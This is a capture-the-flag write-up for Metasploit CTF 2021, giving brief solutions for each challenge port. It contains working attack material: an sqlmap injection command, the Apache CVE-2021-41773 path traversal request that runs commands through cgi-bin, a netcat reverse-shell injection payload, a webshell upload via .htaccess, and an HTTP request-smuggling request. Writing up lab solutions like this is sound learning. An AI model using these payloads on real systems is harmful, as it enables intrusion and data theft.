# Metasploit CTF 2021

Managed to get 17th this time. Not too bad, but no prizes. There were three flags I didn't manage to find: I had the right approach for 15010 but the wrong wordlists apparently, the SSH server on 15122 relied on apparently guessing that the target would connect back to your jump host, which I did not guess, and the reversing challenge required expertise in a technology I did not possess and could not get in the time available :)

Other than that though, very fun! Nice to do some request smuggling, in particular.

## 80 - 4_of_hearts

just on the home page

## 443 - 2_of_spades

nmap detected a git repo
git-dumper retrieved it,
earliest commit contained a .env file with the flag name,
this could then be retrieved from the main site

## 8080 - 9_of_diamonds

website used plaintext cookies to detect if authenticated and if admin
set these both to true then accessed /admin to get the flag

## 10010 - 4_of_diamonds

a site where you could register and view an empty homepage (under construction)
the register page would submit fields like `account[name]`. on the homepage there was a comment showing the json structure of the user, which included a `role` field
by altering register to also submit `account[role]=admin` i was able to create an admin account, access the admin panel and get the flag

## 11111 - 5_of_diamonds

sql injection on the username field of the login form
exploitable with `sqlmap -u http://172.17.23.149:11111/login -p username --code=303 --level 5 --risk 3 --forms --dump`
this got the admin password from the user table, but i had to use repeater to submit this as the form truncated the characters
the admin panel contained a link to the flag

## 12380 - 10_of_clubs

a static page. text indicated it was old school, author prefered 'systems-programming'
this site was vulnerable to CVE-2021-41773/42013, a apache path traversal bug exploiting active cgi-bin
requested `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash` with content type text/plain and sent `echo Content-Type: image/png; echo; cat /secret/safe/flag.png` to get the flag

## 15000 - 5_of_clubs

a student database over netcat. every field has alphanumeric filtering, and if bad characters were entered, would force you to retry. except for one field: the surname field of the delete operation
if a student existed (so had to be created first) then blind os injection could be achieved with a payload like: `surname.txt & rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.23.148 4444 >/tmp/f &`.
this got a rev shell and the flag.

## 15010 - UNSOLVED

    file storage, 4-32 username 64-128 password... something there? limit is not enforced server side
    appears to create a directory that you can save files into; files are stripped of extensions, and only support alpha numeric
    can access files uploaded by other users, if you know the name of the user and file

## 15122 - UNSOLVED

    ssh no creds yet

## 20000 - 2_of_clubs and black joker

download link for a binary for kali/debian, that required a gui. when run on wsl through a ssh proxy to the jump host, would be a hard to play clicker game
automated with a go script after using tshark to capture the message traffic (`sudo tshark -i lo -w clickracer.pcapng`) (for easy mode, just json messages)
this ran and received a message detailing the flag location

for hard mode this involved raw binary messages, but was still as solvable. this got the joker flag

## 20001 - 2_of_clubs and black joker

target address of 20000 client

## 20011 - ace_of_hearts

a gallery site, where you could look up a gallery by url. there was also an admin section

by using the look up as a SSRF vector, and using the url http://127.0.0.1:20011/admin I was able to access the admin page. Requesting this in the browser I was able to unhide the gallery of user 'john', which contained the flag.

## 20022 - jack_of_hearts

home page redirects to challenge.php, which serves a troll face image
'user' cookie was base64->base64->a php session object
changing the admin flag in the object would result in a status message saying 'on the right path'
changing the profile image to /etc/passwd would display an error that reading outside /var/www/html was prohibited, and noting the flag is at /flag.png. using the path `/var/www/html/../../../flag.png`

## 20055 - 9_of_spades

this secure upload service blocked most common extensions. however it did not block .htaccess
i used this to upload an htaccess that mapped a new extension to the php engine: `AddType application/x-httpd-php .lol`, then uploaded a webshell with this extension to reach the flag in the root directory

## 20123 - 8_of_clubs

ssh server, root:root (shown in banner)
challenge is reversing the encryption on the flag, with the python script provided
the salt is fixed, but a token is not. however, if --debug is used this breaks the token generation and that becomes fixed too
accordingly, chaging encrypt to decrypt in the script and then running with --debug decrypts the flag

## 30033 - UNSOLVED

    hosted version of 30034, accessible over nc

## 30034 - UNSOLVED

    directory listing with a challenge binary and a pipfile

## 33337 - 3_of_hearts

can access via host threeofhearts.ctf.net:33337
save.php writes any args, cookie and x-access to /out/save.txt
there is a private.php that is not accessible
the server is ATS/7.11 (Apache Traffic Server) over nginx. ATS is vulnerable to request smuggling
by submitting the following request:

```
POST /save.php HTTP/1.1
Host: threeofhearts.ctf.net:33337
Transfer-Encoding: chunked
Content-Length: 20

0

POST /save.php?
```

I was able to capture an admin request to private.php in the save log. With the admin's cookie I could access private and the flag

## 35000 - ace_of_diamonds

this hosted a pcap file containing smb files, however exporting them left them mangled
a few files in the export were readable, which talked about smb padding. by extracting the smb padding headers with `tshark -r capture.pcap -T fields -e smb.padding > padding.txt` then manipulating this with cyberchef, i found a hex-encoded message revealing the flag url